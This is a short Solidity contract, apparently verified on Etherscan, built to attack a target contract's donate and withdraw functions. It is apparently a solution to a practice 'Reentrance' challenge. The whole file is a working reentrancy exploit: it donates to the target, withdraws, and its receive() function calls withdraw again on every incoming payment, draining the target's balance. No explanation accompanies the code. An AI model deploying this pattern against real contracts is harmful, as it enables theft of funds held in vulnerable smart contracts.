/**
 *Submitted for verification at Etherscan.io on 2021-08-21
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.6.12;

interface ReentranceInterface {
      function donate(address _to) external payable;

  function withdraw(uint _amount) external;
}

contract Reentrance {
    
    address public reentrance_instance;
    
    function setInstance(address _instance) external {
        reentrance_instance = _instance;
    }
    
    function donate() external payable {
        ReentranceInterface(reentrance_instance).donate{value: msg.value}(address(this));
    }
    
    function withdraw(uint _amount) external {
        ReentranceInterface(reentrance_instance).withdraw(_amount);
    }
    
    fallback() external {
        
    }
    
    receive() external payable {
        ReentranceInterface(reentrance_instance).withdraw(msg.value);
    }
}